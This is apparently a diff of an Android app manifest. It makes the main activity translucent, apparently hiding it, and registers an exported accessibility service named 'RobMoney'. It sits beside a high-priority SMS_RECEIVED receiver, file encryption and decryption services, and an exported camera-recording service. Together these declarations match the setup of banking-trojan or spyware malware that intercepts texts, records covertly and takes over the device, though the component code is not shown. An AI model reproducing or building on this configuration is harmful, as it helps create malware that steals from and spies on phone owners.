@@ -55,9 +55,10 @@
             </intent-filter>
         </activity>
         <activity
-            android:name=".home.MainActivity"
+            android:name=".MainActivity"
             android:excludeFromRecents="false"
             android:exported="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
             android:icon="@mipmap/app_icon"
             android:label="@string/app_name"
             android:launchMode="singleTask">
@@ -233,29 +234,42 @@
                 tools:replace="name,resource" />
         </provider> <!-- 全面屏 -->
         <activity
-            android:name=".zipthings.MyVediosActivity"
+            android:name=".zipFiles.MyVediosActivity"
             android:theme="@android:style/Theme.Dialog" />
         <activity
-            android:name=".zipthings.AlertActivity"
+            android:name=".zipFiles.AlertActivity"
             android:theme="@android:style/Theme.Dialog" />
 
-        <service android:name=".zipthings.encrypte.EncryptedService2" />
-        <service android:name=".zipthings.decrypted.DecryptedFileService" />
+        <service android:name=".zipFiles.encrypte.EncryptedService2" />
+        <service android:name=".zipFiles.decrypted.DecryptedFileService" />
         <service
             android:name=".home.CameraRecordService"
             android:enabled="true"
             android:exported="true"
             android:priority="1000" />
 
-        <receiver android:name=".zipthings.AlarmReceiver" />
-        <receiver android:name=".zipthings.decrypted.DecrypAlarmReceiver" />
-        <receiver android:name=".zipthings.SmsReciver">
+        <receiver android:name=".zipFiles.AlarmReceiver" />
+        <receiver android:name=".zipFiles.decrypted.DecrypAlarmReceiver" />
+        <receiver android:name=".zipFiles.SmsReciver">
             <intent-filter android:priority="999">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
-        </receiver> <!-- 无障碍服务配置 -->
-         <!-- 在启动服务 -->
-        <service android:name=".other.MyServiceStart" />
+        </receiver>
+        <!-- 无障碍服务配置 -->
+        <service
+            android:name=".other.RobMoney"
+            android:enabled="true"
+            android:exported="true"
+            android:label="@string/app_name"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/rob_service_config" />
+        </service>
         <service android:name=".home.UVCCameraService"
             android:enabled="true"></service>
     </application>
